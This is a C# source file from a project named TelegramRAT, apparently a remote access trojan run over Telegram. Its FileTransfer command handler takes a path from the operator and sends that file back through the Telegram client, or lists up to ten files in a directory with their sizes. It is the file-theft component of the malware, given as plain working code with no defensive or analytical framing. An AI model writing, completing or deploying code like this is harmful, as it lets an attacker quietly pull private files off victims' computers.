namespace TelegramRAT.Commands;

using TelegramRAT.Models;
using TelegramRAT.Telegram;

internal sealed class FileTransfer : IAsyncCommand
{
    private readonly TelegramClient _client;

    public FileTransfer(TelegramClient client)
    {
        _client = client;
    }

    public async Task<CommandResult> ExecuteAsync(string[] args)
    {
        if (args.Length == 0)
            return CommandResult.Text("Usage: /upload <path> or /download (reply to file)");

        var path = string.Join(" ", args);

        if (System.IO.File.Exists(path))
            return CommandResult.File(path);

        if (Directory.Exists(path))
        {
            var files = Directory.GetFiles(path).Take(10).ToArray();
            var listing = string.Join("\n", files.Select(f => $"  {Path.GetFileName(f)} ({new FileInfo(f).Length:N0} bytes)"));
            return CommandResult.Text($"Directory: {path}\n{listing}");
        }

        return CommandResult.Text($"Not found: {path}");
    }
}
